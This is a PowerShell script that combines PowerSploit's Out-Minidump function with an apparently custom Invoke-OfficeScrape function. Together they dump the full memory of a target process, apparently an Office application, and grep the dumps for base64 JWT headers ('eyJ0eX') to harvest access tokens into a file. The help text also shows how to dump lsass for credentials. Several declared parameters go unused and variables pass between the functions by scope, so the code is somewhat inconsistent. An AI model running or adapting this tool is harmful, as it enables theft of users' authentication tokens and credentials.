
function Out-Minidump
{
    # sourced from the PowerSploit project: https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
    [CmdletBinding()]
Param (

    [Parameter(Position = 0, Mandatory = $False, ValueFromPipeline = $True)]
    [String]
    $Proc,

    [Parameter(Position = 1)]
    [ValidateScript({ Test-Path $_ })]
    [String]
    $DumpFilePath = $PWD,

    [Parameter(Mandatory=$false)]
    [String]$LogHost,

    [Parameter(Mandatory=$false)]
    [string[]]$User,

    [Parameter(Mandatory=$false)]
    [Switch]$NumsOnly = $False,
    
    [Parameter(Mandatory=$false)]
    [Switch]$Logging,

    [Parameter(Mandatory=$false)]
    [String]$Bin
)
<#
.SYNOPSIS

    Generates a full-memory minidump of a process.

    PowerSploit Function: Out-Minidump
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.DESCRIPTION

    Out-Minidump writes a process dump file with all process memory to disk.
    This is similar to running procdump.exe with the '-ma' switch.

.PARAMETER Process

    Specifies the process for which a dump will be generated. The process object
    is obtained with Get-Process.

.PARAMETER DumpFilePath

    Specifies the path where dump files will be written. By default, dump files
    are written to the current working directory. Dump file names take following
    form: processname_id.dmp

.EXAMPLE

    Out-Minidump -Process (Get-Process -Id 4293)

    Description
    -----------
    Generate a minidump for process ID 4293.

.EXAMPLE

    Get-Process lsass | Out-Minidump

    Description
    -----------
    Generate a minidump for the lsass process. Note: To dump lsass, you must be
    running from an elevated prompt.

.EXAMPLE

    Get-Process | Out-Minidump -DumpFilePath C:\temp

    Description
    -----------
    Generate a minidump of all running processes and save them to C:\temp.

.INPUTS

    System.Diagnostics.Process

    You can pipe a process object to Out-Minidump.

.OUTPUTS

    System.IO.FileInfo

.LINK

    http://www.exploit-monday.com/
#>

    

    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS
    {
        $Process = $p
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"

        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-not $Result)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            # Remove any partially written dump files. For example, a partial dump will be written
            # in the case when 32-bit PowerShell tries to dump a 64-bit process.
            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProcessDumpPath
        }
    }

    END {}
}
function Invoke-OfficeScrape {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [String]
        $Proc,
    
        [Parameter()]
        [String]
        $Outfile
    
    )
    # Save Memory Dump to current directory
    $dest = $PWD
    
    Write-Output "Starting Scraper"
    
        $Procs = Get-Process $Proc -ErrorAction SilentlyContinue #| Select -Property Responding
        if ($Procs) {
            Write-Output "Target process is running. Dumping memory..."
            foreach ($p in $Procs) {
                Out-Minidump -DumpFilePath $dest
            }
            $dumps = Get-ChildItem -Path $dest -Filter *.dmp | select FullName
            foreach ($d in $dumps) {
                Write-Output "Scraping memory dump: $($d.FullName)"
                $output = select-string -Path $d.FullName -Pattern eyJ0eX   
                $output | out-file -encoding ascii $outfile
            }
        }
        else {
            Write-Output "Target process not running"
        }
    }
